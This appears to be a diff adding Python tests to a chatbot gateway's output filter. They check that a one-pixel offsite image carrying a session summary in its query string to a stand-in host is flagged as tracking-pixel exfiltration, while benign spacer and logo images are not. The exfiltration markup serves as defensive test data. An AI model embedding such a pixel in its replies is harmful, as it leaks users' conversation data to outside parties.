@@ -366,3 +366,17 @@ def test_gateway_e2e_output_blocks_templated_reply() -> None:
     assert body["output_blocked"] is True
     assert body["output_decision"] == "block"
     assert "collector.test" not in (body["reply"] or "")
+
+
+# ── 1px 跟踪像素回传(eg-render-03 靶,评审 #111 复审路径B)──────────────────────
+def test_tracking_pixel_with_query_payload_flagged() -> None:
+    """离域 1px img ∧ 查询串带数据 → tracking_pixel_exfil(approve 复核档 0.65)。"""
+    f = _detect('<img src="https://x.example/p.png?d=会话摘要" width=1 height=1>办理完成。')
+    assert "tracking_pixel_exfil" in _kinds(f)
+    assert 0.6 <= _top(f, "tracking_pixel_exfil").score < 0.8
+
+
+def test_benign_pixels_and_normal_images_not_flagged() -> None:
+    """良性:无查询参数的 1px spacer、正常尺寸带版本查询的图——均不命中。"""
+    assert _detect('<img src="https://cdn.gov.cn/spacer.gif" width="1" height="1">') == []
+    assert _detect('<img src="https://cdn.gov.cn/logo.png?v=2" width="120" height="60">') == []
